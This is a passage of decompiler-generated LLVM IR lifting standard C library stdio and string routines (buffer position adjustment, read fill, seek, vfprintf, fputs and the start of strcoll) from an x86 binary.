  uselistorder i32 2147483647, { 3, 1, 2, 4, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058881, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8058890 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058890, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8058898 = load i16, i16* %arg1, align 2
  %v3_8058898 = zext i16 %v2_8058898 to i32
  store i32 %v3_8058898, i32* @ecx, align 4
  %tmp = urem i16 %v2_8058898, 4
  %v1_805889d = zext i16 %tmp to i32
  %v2_805889d = icmp eq i16 %tmp, 0
  br i1 %v2_805889d, label %dec_label_pc_80588cc, label %dec_label_pc_80588a2

dec_label_pc_80588a2:                             ; preds = %entry
  %v1_80588a4 = add nsw i32 %v1_805889d, -1
  %v8_80588a4 = icmp eq i32 %v1_80588a4, 0
  store i32 %v1_80588a4, i32* @edx, align 4
  br i1 %v8_80588a4, label %dec_label_pc_80588cc, label %dec_label_pc_80588a7

dec_label_pc_80588a7:                             ; preds = %dec_label_pc_80588a2
  %v3_80588a7 = and i32 %v3_8058898, 2048
  %v4_80588a7 = icmp eq i32 %v3_80588a7, 0
  br i1 %v4_80588a7, label %dec_label_pc_80588cc, label %dec_label_pc_80588ac

dec_label_pc_80588ac:                             ; preds = %dec_label_pc_80588a7
  %v6_80588ac = sub nsw i32 1, %v1_805889d
  %v7_80588ac = and i32 %v1_80588a4, %v6_80588ac
  %v8_80588ac = icmp slt i32 %v7_80588ac, 0
  %v9_80588ac = icmp eq i16 %tmp, 2
  %v10_80588ac = icmp ult i16 %tmp, 2
  %v3_80588af = icmp eq i1 %v10_80588ac, %v8_80588ac
  %v4_80588af = icmp eq i1 %v9_80588ac, false
  %v5_80588af = and i1 %v4_80588af, %v3_80588af
  br i1 %v5_80588af, label %dec_label_pc_8058920, label %dec_label_pc_80588b1

dec_label_pc_80588b1:                             ; preds = %dec_label_pc_80588ac
  %v1_80588b1 = add i32 %v4_8058890, 40
  %v2_80588b1 = inttoptr i32 %v1_80588b1 to i32*
  %v3_80588b1 = load i32, i32* %v2_80588b1, align 4
  %v4_80588b1 = icmp eq i32 %v3_80588b1, 0
  %v1_80588b5 = icmp eq i1 %v4_80588b1, false
  br i1 %v1_80588b5, label %dec_label_pc_8058920, label %dec_label_pc_80588b7

dec_label_pc_80588b7:                             ; preds = %dec_label_pc_80588b1
  %v1_80588b7 = add i32 %v4_8058890, 3
  %v2_80588b7 = inttoptr i32 %v1_80588b7 to i8*
  %v3_80588b7 = load i8, i8* %v2_80588b7, align 1
  %v4_80588b7 = zext i8 %v3_80588b7 to i32
  %v2_80588bb = sub nsw i32 %v1_80588a4, %v4_80588b7
  %v1_80588bd = add i32 %v4_8058890, 44
  %v2_80588bd = inttoptr i32 %v1_80588bd to i32*
  %v3_80588bd = load i32, i32* %v2_80588bd, align 4
  %v1_80588c1 = add nsw i32 %v2_80588bb, -1
  %tmp11 = icmp slt i32 %v3_80588bd, 1
  br i1 %tmp11, label %dec_label_pc_80588cc, label %dec_label_pc_80588c6

dec_label_pc_80588c6:                             ; preds = %dec_label_pc_80588b7
  %v1_80588c6 = add i32 %v4_8058890, 2
  %v2_80588c6 = inttoptr i32 %v1_80588c6 to i8*
  %v3_80588c6 = load i8, i8* %v2_80588c6, align 1
  %v4_80588c6 = zext i8 %v3_80588c6 to i32
  %v2_80588ca = sub nsw i32 %v1_80588c1, %v4_80588c6
  br label %dec_label_pc_80588cc

dec_label_pc_80588cc:                             ; preds = %dec_label_pc_80588b7, %dec_label_pc_80588a7, %dec_label_pc_80588a2, %entry, %dec_label_pc_80588c6
  %v0_80588e1 = phi i32 [ %v1_80588c1, %dec_label_pc_80588b7 ], [ %v1_80588a4, %dec_label_pc_80588a7 ], [ 0, %dec_label_pc_80588a2 ], [ 0, %entry ], [ %v2_80588ca, %dec_label_pc_80588c6 ]
  %v2_80588cc = and i32 %v3_8058898, 64
  %v3_80588cc = icmp eq i32 %v2_80588cc, 0
  %storemerge.in.in.v = select i1 %v3_80588cc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8058890
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80588d9 = add i32 %v4_8058890, 16
  %v3_80588d9 = inttoptr i32 %v2_80588d9 to i32*
  %v4_80588d9 = load i32, i32* %v3_80588d9, align 4
  %v5_80588d9 = sub i32 %storemerge, %v4_80588d9
  %v1_80588dc = inttoptr i32 %arg2 to i32*
  %v2_80588dc = load i32, i32* %v1_80588dc, align 4
  store i32 %v2_80588dc, i32* @ecx, align 4
  %v1_80588de = add i32 %arg2, 4
  %v2_80588de = inttoptr i32 %v1_80588de to i32*
  %v3_80588de = load i32, i32* %v2_80588de, align 4
  store i32 %v3_80588de, i32* %ebx.global-to-local, align 4
  %v2_80588e1 = add i32 %v5_80588d9, %v0_80588e1
  store i32 %v2_80588e1, i32* %esi.global-to-local, align 4
  %v5_80588f5 = sub i32 %v2_80588dc, %v2_80588e1
  %v10_80588f5 = icmp ult i32 %v2_80588dc, %v2_80588e1
  %v6_80588f9 = zext i1 %v10_80588f5 to i32
  %tmp13 = icmp slt i32 %v2_80588e1, 0
  %v2_80588e6.neg = zext i1 %tmp13 to i32
  %v7_80588f9 = add i32 %v3_80588de, %v2_80588e6.neg
  %v8_80588f9 = add i32 %v7_80588f9, %v6_80588f9
  store i32 %v8_80588f9, i32* @edx, align 4
  store i32 %v5_80588f5, i32* %v1_80588dc, align 4
  %v0_80588ff = load i32, i32* @edx, align 4
  %v1_80588ff = load i32, i32* %edi.global-to-local, align 4
  %v2_80588ff = add i32 %v1_80588ff, 4
  %v3_80588ff = inttoptr i32 %v2_80588ff to i32*
  store i32 %v0_80588ff, i32* %v3_80588ff, align 4
  %v0_8058902 = load i32, i32* %edi.global-to-local, align 4
  %v1_8058902 = add i32 %v0_8058902, 4
  %v2_8058902 = inttoptr i32 %v1_8058902 to i32*
  %v3_8058902 = load i32, i32* %v2_8058902, align 4
  %v4_8058902 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8058905 = icmp slt i32 %v3_8058902, %v4_8058902
  br i1 %v5_8058905, label %dec_label_pc_805890f, label %dec_label_pc_8058907

dec_label_pc_8058907:                             ; preds = %dec_label_pc_80588cc
  %v8_8058907 = icmp sgt i32 %v3_8058902, %v4_8058902
  br i1 %v8_8058907, label %dec_label_pc_805890d, label %dec_label_pc_8058909

dec_label_pc_8058909:                             ; preds = %dec_label_pc_8058907
  %v1_8058909 = inttoptr i32 %v0_8058902 to i32*
  %v2_8058909 = load i32, i32* %v1_8058909, align 4
  %v3_8058909 = load i32, i32* @ecx, align 4
  %tmp14 = icmp ugt i32 %v2_8058909, %v3_8058909
  br i1 %tmp14, label %dec_label_pc_805890d, label %dec_label_pc_805890f

dec_label_pc_805890d:                             ; preds = %dec_label_pc_8058909, %dec_label_pc_8058907
  %v0_805890d = load i32, i32* %esi.global-to-local, align 4
  %v1_805890d = sub i32 0, %v0_805890d
  store i32 %v1_805890d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805890f

dec_label_pc_805890f:                             ; preds = %dec_label_pc_8058909, %dec_label_pc_80588cc, %dec_label_pc_805890d
  %v0_805890f = load i32, i32* %esi.global-to-local, align 4
  %v2_805890f = icmp slt i32 %v0_805890f, 0
  %v1_8058911 = icmp eq i1 %v2_805890f, false
  br i1 %v1_8058911, label %dec_label_pc_8058923, label %dec_label_pc_8058913

dec_label_pc_8058913:                             ; preds = %dec_label_pc_805890f
  %v1_8058913 = call i32 @__errno_location(i32 %v2_80588e1)
  %v1_8058918 = inttoptr i32 %v1_8058913 to i32*
  store i32 75, i32* %v1_8058918, align 4
  %v0_8058926.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058923

dec_label_pc_8058920:                             ; preds = %dec_label_pc_80588b1, %dec_label_pc_80588ac
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8058923

dec_label_pc_8058923:                             ; preds = %dec_label_pc_805890f, %dec_label_pc_8058913, %dec_label_pc_8058920
  %v0_8058926 = phi i32 [ %v0_805890f, %dec_label_pc_805890f ], [ %v0_8058926.pre, %dec_label_pc_8058913 ], [ -1, %dec_label_pc_8058920 ]
  ret i32 %v0_8058926

; uselistorder directives
  uselistorder i32 %v4_8058902, { 1, 0 }
  uselistorder i32 %v3_8058902, { 1, 0 }
  uselistorder i32 %v2_80588e1, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_80588a4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8058890, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8058923, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805890f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80588cc, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_805892c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8058934 = add i32 %arg1, 8
  %v2_8058934 = inttoptr i32 %v1_8058934 to i32*
  %v3_8058934 = load i32, i32* %v2_8058934, align 4
  store i32 %v3_8058934, i32* %edx.global-to-local, align 4
  %v1_8058937 = add i32 %arg1, 12
  %v2_8058937 = inttoptr i32 %v1_8058937 to i32*
  %v3_8058937 = load i32, i32* %v2_8058937, align 4
  %v2_805893a = sub i32 %v3_8058937, %v3_8058934
  %v3_805893f = inttoptr i32 %arg1 to i16*
  %v4_805893f = call i32 @__stdio_READ(i16* %v3_805893f, i32 %v3_8058934, i32 %v2_805893a)
  %v0_8058944 = load i32, i32* @ebx, align 4
  %v1_8058944 = add i32 %v0_8058944, 8
  %v2_8058944 = inttoptr i32 %v1_8058944 to i32*
  %v3_8058944 = load i32, i32* %v2_8058944, align 4
  store i32 %v3_8058944, i32* %edx.global-to-local, align 4
  %v2_8058947 = add i32 %v0_8058944, 16
  %v3_8058947 = inttoptr i32 %v2_8058947 to i32*
  store i32 %v3_8058944, i32* %v3_8058947, align 4
  %v0_805894a = load i32, i32* %edx.global-to-local, align 4
  %v2_805894a = add i32 %v0_805894a, %v4_805893f
  store i32 %v2_805894a, i32* %edx.global-to-local, align 4
  %v1_805894c = load i32, i32* @ebx, align 4
  %v2_805894c = add i32 %v1_805894c, 20
  %v3_805894c = inttoptr i32 %v2_805894c to i32*
  store i32 %v2_805894a, i32* %v3_805894c, align 4
  store i32 %v0_805892c, i32* @ebx, align 4
  ret i32 %v4_805893f

; uselistorder directives
  uselistorder i32 %v4_805893f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8058954 = load i32, i32* @ebx, align 4
  %v4_8058958 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8058958, i32* @ebx, align 4
  %v2_8058960 = load i16, i16* %arg1, align 2
  %v3_8058960 = zext i16 %v2_8058960 to i32
  %v2_8058963 = and i32 %v3_8058960, %arg2
  %v3_8058963 = icmp eq i32 %v2_8058963, 0
  %v1_8058965 = icmp eq i1 %v3_8058963, false
  br i1 %v1_8058965, label %dec_label_pc_8058973, label %dec_label_pc_8058967

dec_label_pc_8058967:                             ; preds = %entry
  %v1_8058967 = and i32 %v3_8058960, 2176
  %v2_8058967 = icmp eq i32 %v1_8058967, 0
  %v1_805896c = icmp eq i1 %v2_8058967, false
  br i1 %v1_805896c, label %dec_label_pc_805897a, label %dec_label_pc_805896e

dec_label_pc_805896e:                             ; preds = %dec_label_pc_8058967
  %v2_805896e = or i32 %v3_8058960, %arg2
  %v1_8058970 = trunc i32 %v2_805896e to i16
  store i16 %v1_8058970, i16* %arg1, align 2
  %v0_8058973.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058973

dec_label_pc_8058973:                             ; preds = %entry, %dec_label_pc_805896e
  %v0_8058999 = phi i32 [ %v4_8058958, %entry ], [ %v0_8058973.pre, %dec_label_pc_805896e ]
  %v1_8058973 = inttoptr i32 %v0_8058999 to i16*
  %v2_8058973 = load i16, i16* %v1_8058973, align 2
  %v2_8058976 = and i16 %v2_8058973, 16
  %v3_8058976 = icmp eq i16 %v2_8058976, 0
  br i1 %v3_8058976, label %dec_label_pc_8058992, label %dec_label_pc_805897a

dec_label_pc_805897a:                             ; preds = %dec_label_pc_8058973, %dec_label_pc_8058967
  %v1_805897a = call i32 @__errno_location(i32 %v0_8058954)
  %v1_805897f = inttoptr i32 %v1_805897a to i32*
  store i32 9, i32* %v1_805897f, align 4
  br label %dec_label_pc_8058985

dec_label_pc_8058985:                             ; preds = %dec_label_pc_8058996, %dec_label_pc_805897a
  %v0_8058985 = load i32, i32* @ebx, align 4
  %v1_8058985 = inttoptr i32 %v0_8058985 to i32*
  %v2_8058985 = load i32, i32* %v1_8058985, align 4
  %v1_8058987 = or i32 %v2_8058985, 8
  %v1_805898a = trunc i32 %v1_8058987 to i16
  %v3_805898a = inttoptr i32 %v0_8058985 to i16*
  store i16 %v1_805898a, i16* %v3_805898a, align 2
  br label %dec_label_pc_80589be

dec_label_pc_8058992:                             ; preds = %dec_label_pc_8058973
  %v2_8058992 = and i16 %v2_8058973, 64
  %v3_8058992 = icmp eq i16 %v2_8058992, 0
  br i1 %v3_8058992, label %dec_label_pc_80589b4, label %dec_label_pc_8058996

dec_label_pc_8058996:                             ; preds = %dec_label_pc_8058992
  %v2_805899a = call i32 @__stdio_wcommit(i32 %v0_8058999)
  %v1_80589a2 = icmp eq i32 %v2_805899a, 0
  %v1_80589a4 = icmp eq i1 %v1_80589a2, false
  br i1 %v1_80589a4, label %dec_label_pc_8058985, label %dec_label_pc_80589a6

dec_label_pc_80589a6:                             ; preds = %dec_label_pc_8058996
  %v0_80589a6 = load i32, i32* @ebx, align 4
  %v1_80589a6 = add i32 %v0_80589a6, 8
  %v2_80589a6 = inttoptr i32 %v1_80589a6 to i32*
  %v3_80589a6 = load i32, i32* %v2_80589a6, align 4
  %v2_80589a9 = add i32 %v0_80589a6, 28
  %v3_80589a9 = inttoptr i32 %v2_80589a9 to i32*
  store i32 %v3_80589a6, i32* %v3_80589a9, align 4
  %v0_80589ac = load i32, i32* @ebx, align 4
  %v1_80589ac = inttoptr i32 %v0_80589ac to i32*
  %v2_80589ac = load i32, i32* %v1_80589ac, align 4
  %v2_80589ac.tr = trunc i32 %v2_80589ac to i16
  %v1_80589b1 = and i16 %v2_80589ac.tr, -65
  %v3_80589b1 = inttoptr i32 %v0_80589ac to i16*
  store i16 %v1_80589b1, i16* %v3_80589b1, align 2
  %v0_80589b4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80589b4

dec_label_pc_80589b4:                             ; preds = %dec_label_pc_8058992, %dec_label_pc_80589a6
  %v2_80589b9 = phi i32 [ %v0_8058999, %dec_label_pc_8058992 ], [ %v0_80589b4.pre, %dec_label_pc_80589a6 ]
  %v1_80589b4 = inttoptr i32 %v2_80589b9 to i32*
  %v2_80589b4 = load i32, i32* %v1_80589b4, align 4
  %v1_80589b6 = or i32 %v2_80589b4, 1
  %v1_80589b9 = trunc i32 %v1_80589b6 to i16
  %v3_80589b9 = inttoptr i32 %v2_80589b9 to i16*
  store i16 %v1_80589b9, i16* %v3_80589b9, align 2
  br label %dec_label_pc_80589be

dec_label_pc_80589be:                             ; preds = %dec_label_pc_8058985, %dec_label_pc_80589b4
  %storemerge = phi i32 [ 0, %dec_label_pc_80589b4 ], [ -1, %dec_label_pc_8058985 ]
  %v2_80589be = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80589be, i32* @edx, align 4
  store i32 %v0_8058954, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8058960, { 0, 2, 1 }
  uselistorder i32 %v0_8058954, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80589be, { 1, 0 }
  uselistorder label %dec_label_pc_80589b4, { 1, 0 }
  uselistorder label %dec_label_pc_8058973, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80589d0 = add i32 %tmp5, 4
  %v2_80589d0 = inttoptr i32 %v1_80589d0 to i32*
  %v3_80589d0 = load i32, i32* %v2_80589d0, align 4
  %v2_80589d3 = load i32, i32* %arg2, align 4
  %v1_80589d9 = add i32 %arg1, 4
  %v2_80589d9 = inttoptr i32 %v1_80589d9 to i32*
  %v3_80589d9 = load i32, i32* %v2_80589d9, align 4
  %v4_80589dc = call i32 @__libc_lseek64(i32 %v3_80589d9, i32 %v2_80589d3, i32 %v3_80589d0, i32 %arg3)
  %v0_80589e4 = load i32, i32* @edx, align 4
  %v2_80589e4 = icmp slt i32 %v0_80589e4, 0
  store i32 %v4_80589dc, i32* %ecx.global-to-local, align 4
  br i1 %v2_80589e4, label %dec_label_pc_80589f1, label %dec_label_pc_80589ea

dec_label_pc_80589ea:                             ; preds = %entry
  %v1_80589ea = load i32, i32* @ebx, align 4
  %v2_80589ea = inttoptr i32 %v1_80589ea to i32*
  store i32 %v4_80589dc, i32* %v2_80589ea, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_80589ee = load i32, i32* @edx, align 4
  %v1_80589ee = load i32, i32* @ebx, align 4
  %v2_80589ee = add i32 %v1_80589ee, 4
  %v3_80589ee = inttoptr i32 %v2_80589ee to i32*
  store i32 %v0_80589ee, i32* %v3_80589ee, align 4
  %v0_80589f2.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80589f1

dec_label_pc_80589f1:                             ; preds = %entry, %dec_label_pc_80589ea
  %v0_80589f2 = phi i32 [ %v4_80589dc, %entry ], [ %v0_80589f2.pre, %dec_label_pc_80589ea ]
  ret i32 %v0_80589f2

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_80589f1, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_80589f8 = load i32, i32* @edi, align 4
  %v0_80589fa = load i32, i32* @ebx, align 4
  %v4_80589fe = ptrtoint i16* %arg1 to i32
  store i32 %v4_80589fe, i32* @esi, align 4
  %v1_8058a02 = add i32 %v4_80589fe, 52
  %v2_8058a02 = inttoptr i32 %v1_8058a02 to i32*
  %v3_8058a02 = load i32, i32* %v2_8058a02, align 4
  store i32 %v3_8058a02, i32* @edi, align 4
  %v1_8058a05 = icmp eq i32 %v3_8058a02, 0
  %v1_8058a07 = icmp eq i1 %v1_8058a05, false
  br i1 %v1_8058a07, label %dec_label_pc_8058a28, label %dec_label_pc_8058a09

dec_label_pc_8058a09:                             ; preds = %entry
  %v1_8058a09 = add i32 %v4_80589fe, 56
  store i32 %v1_8058a09, i32* @ebx, align 4
  %v5_8058a18 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134541533, i32 %v1_8058a09)
  %v0_8058a1d = load i32, i32* @ebx, align 4
  %v2_8058a20 = call i32 @pthread_mutex_lock(i32 %v0_8058a1d)
  %v0_8058a28.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058a28

dec_label_pc_8058a28:                             ; preds = %entry, %dec_label_pc_8058a09
  %v0_8058a41 = phi i32 [ %v4_80589fe, %entry ], [ %v0_8058a28.pre, %dec_label_pc_8058a09 ]
  %v1_8058a28 = inttoptr i32 %v0_8058a41 to i16*
  %v2_8058a28 = load i16, i16* %v1_8058a28, align 2
  %v1_8058a2b = and i16 %v2_8058a28, 192
  %v6_8058a30 = icmp eq i16 %v1_8058a2b, 192
  br i1 %v6_8058a30, label %dec_label_pc_8058a28.dec_label_pc_8058a4e_crit_edge, label %dec_label_pc_8058a37

dec_label_pc_8058a28.dec_label_pc_8058a4e_crit_edge: ; preds = %dec_label_pc_8058a28
  br label %dec_label_pc_8058a4e

dec_label_pc_8058a37:                             ; preds = %dec_label_pc_8058a28
  %v0_8058a37 = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_8058a42 = call i32 @__stdio_trans2w_o(i16* %v1_8058a28, i32 128, i32 %v0_8058a37, i32 %v0_8058a37)
  %v1_8058a4a = icmp eq i32 %v6_8058a42, 0
  %v1_8058a4c = icmp eq i1 %v1_8058a4a, false
  br i1 %v1_8058a4c, label %dec_label_pc_8058a62, label %dec_label_pc_8058a37.dec_label_pc_8058a4e_crit_edge

dec_label_pc_8058a37.dec_label_pc_8058a4e_crit_edge: ; preds = %dec_label_pc_8058a37
  %v0_8058a57.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058a4e

dec_label_pc_8058a4e:                             ; preds = %dec_label_pc_8058a28.dec_label_pc_8058a4e_crit_edge, %dec_label_pc_8058a37.dec_label_pc_8058a4e_crit_edge
  %v0_8058a57 = phi i32 [ %v0_8058a41, %dec_label_pc_8058a28.dec_label_pc_8058a4e_crit_edge ], [ %v0_8058a57.pre, %dec_label_pc_8058a37.dec_label_pc_8058a4e_crit_edge ]
  %v4_8058a58 = inttoptr i32 %arg2 to i8*
  %v5_8058a58 = call i32 @_vfprintf_internal(i32 %v0_8058a57, i8* %v4_8058a58, i32 %arg3)
  store i32 %v5_8058a58, i32* @ebx, align 4
  br label %dec_label_pc_8058a62

dec_label_pc_8058a62:                             ; preds = %dec_label_pc_8058a37, %dec_label_pc_8058a4e
  br i1 %v1_8058a07, label %dec_label_pc_8058a77, label %dec_label_pc_8058a66

dec_label_pc_8058a66:                             ; preds = %dec_label_pc_8058a62
  %v4_8058a6f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_8058a77

dec_label_pc_8058a77:                             ; preds = %dec_label_pc_8058a62, %dec_label_pc_8058a66
  %v0_8058a7a = load i32, i32* @ebx, align 4
  store i32 %v0_80589fa, i32* @ebx, align 4
  store i32 %v0_80589f8, i32* @edi, align 4
  ret i32 %v0_8058a7a

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058a77, { 1, 0 }
  uselistorder label %dec_label_pc_8058a62, { 1, 0 }
  uselistorder label %dec_label_pc_8058a4e, { 1, 0 }
  uselistorder label %dec_label_pc_8058a28, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8058a80 = load i32, i32* @edi, align 4
  %v0_8058a81 = load i32, i32* @esi, align 4
  %v0_8058a82 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_8058a8a = add i32 %arg2, 52
  %v2_8058a8a = inttoptr i32 %v1_8058a8a to i32*
  %v3_8058a8a = load i32, i32* %v2_8058a8a, align 4
  store i32 %v3_8058a8a, i32* @edi, align 4
  %v1_8058a8d = icmp eq i32 %v3_8058a8a, 0
  %v1_8058a8f = icmp eq i1 %v1_8058a8d, false
  br i1 %v1_8058a8f, label %entry.dec_label_pc_8058ab0_crit_edge, label %dec_label_pc_8058a91

entry.dec_label_pc_8058ab0_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8058ab0

dec_label_pc_8058a91:                             ; preds = %entry
  %v1_8058a91 = add i32 %arg2, 56
  store i32 %v1_8058a91, i32* @ebx, align 4
  %v4_8058aa0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134541533, i32 %v1_8058a91)
  %v0_8058aa5 = load i32, i32* @ebx, align 4
  %v1_8058aa8 = call i32 @pthread_mutex_lock(i32 %v0_8058aa5)
  %v0_8058ab2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058ab0

dec_label_pc_8058ab0:                             ; preds = %entry.dec_label_pc_8058ab0_crit_edge, %dec_label_pc_8058a91
  %v0_8058ab2 = phi i32 [ %arg2, %entry.dec_label_pc_8058ab0_crit_edge ], [ %v0_8058ab2.pre, %dec_label_pc_8058a91 ]
  %v0_8058ab0 = load i32, i32* @edx, align 4
  %v4_8058ab7 = inttoptr i32 %arg1 to i8*
  %v5_8058ab7 = call i32 @__GI_fputs_unlocked(i8* %v4_8058ab7, i32 %v0_8058ab2, i32 %v0_8058ab0, i32 %v0_8058ab0)
  store i32 %v5_8058ab7, i32* @ebx, align 4
  br i1 %v1_8058a8f, label %dec_label_pc_8058ad6, label %dec_label_pc_8058ac5

dec_label_pc_8058ac5:                             ; preds = %dec_label_pc_8058ab0
  %v3_8058ace = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_8058ad9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058ad6

dec_label_pc_8058ad6:                             ; preds = %dec_label_pc_8058ab0, %dec_label_pc_8058ac5
  %v0_8058ad9 = phi i32 [ %v5_8058ab7, %dec_label_pc_8058ab0 ], [ %v0_8058ad9.pre, %dec_label_pc_8058ac5 ]
  store i32 %v0_8058a82, i32* @ebx, align 4
  store i32 %v0_8058a81, i32* @esi, align 4
  store i32 %v0_8058a80, i32* @edi, align 4
  ret i32 %v0_8058ad9

; uselistorder directives
  uselistorder i32 (i32*, i32)* @__pthread_cleanup_pop_restore, { 29, 28, 30, 32, 33, 7, 8, 9, 10, 11, 12, 13, 31, 36, 6, 0, 1, 27, 37, 34, 35, 14, 16, 17, 18, 19, 20, 15, 21, 2, 22, 23, 3, 4, 5, 24, 25, 26 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 13, 15, 14, 10, 11, 39, 38, 37, 36, 35, 34, 33, 12, 4, 40, 52, 51, 19, 3, 0, 2, 8, 9, 32, 30, 29, 28, 27, 26, 31, 25, 44, 24, 23, 43, 42, 41, 22, 21, 20, 50, 49, 53, 1, 5, 18, 7, 6, 48, 47, 46, 45, 17, 16 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 30, 28, 29, 33, 32, 7, 8, 9, 10, 11, 12, 13, 31, 36, 6, 0, 1, 27, 37, 35, 34, 14, 16, 17, 18, 19, 20, 15, 21, 2, 22, 23, 3, 4, 5, 24, 25, 26 }
  uselistorder i32 134541533, { 2, 3, 4, 5, 6, 7, 36, 39, 40, 41, 42, 43, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 27, 28, 29, 18, 19, 20, 21, 22, 23, 30, 37, 31, 38, 32, 33, 35, 24, 34, 25, 26 }
  uselistorder i32 52, { 21, 19, 20, 2, 12, 3, 4, 5, 6, 23, 24, 13, 15, 11, 18, 22, 16, 17, 8, 9, 10, 7, 1, 0, 14 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8058ad6, { 1, 0 }
  uselistorder label %dec_label_pc_8058ab0, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8058ae2 = ptrtoint i8* %arg1 to i32
  %v4_8058aea.pre = load i32, i32* @eax, align 4
  %v8_8058aea.pre = load i1, i1* @df, align 1
  %v9_8058aea = select i1 %v8_8058aea.pre, i32 -1, i32 1
  br label %dec_label_pc_8058aea

dec_label_pc_8058aea:                             ; preds = %dec_label_pc_8058aee, %entry
  %v20_8058aeb = phi i32 [ %v23_8058aeb, %dec_label_pc_8058aee ], [ %arg2, %entry ]
  %v4_8058aea = phi i32 [ %v6_8058aea, %dec_label_pc_8058aee ], [ %v4_8058aea.pre, %entry ]
  %v7_8058aea = phi i32 [ %v10_8058aea, %dec_label_pc_8058aee ], [ %v4_8058ae2, %entry ]
  %v1_8058aea = inttoptr i32 %v7_8058aea to i8*
  %v2_8058aea = load i8, i8* %v1_8058aea, align 1
  %v3_8058aeb = inttoptr i32 %v20_8058aeb to i8*
  %v4_8058aeb = load i8, i8* %v3_8058aeb, align 1
  %v15_8058aeb = icmp eq i8 %v2_8058aea, %v4_8058aeb
  %v1_8058aec = icmp eq i1 %v15_8058aeb, false
  br i1 %v1_8058aec, label %dec_label_pc_8058af6, label %dec_label_pc_8058aee

dec_label_pc_8058aee:                             ; preds = %dec_label_pc_8058aea
  %v3_8058aea = zext i8 %v2_8058aea to i32
  %v5_8058aea = and i32 %v4_8058aea, -256
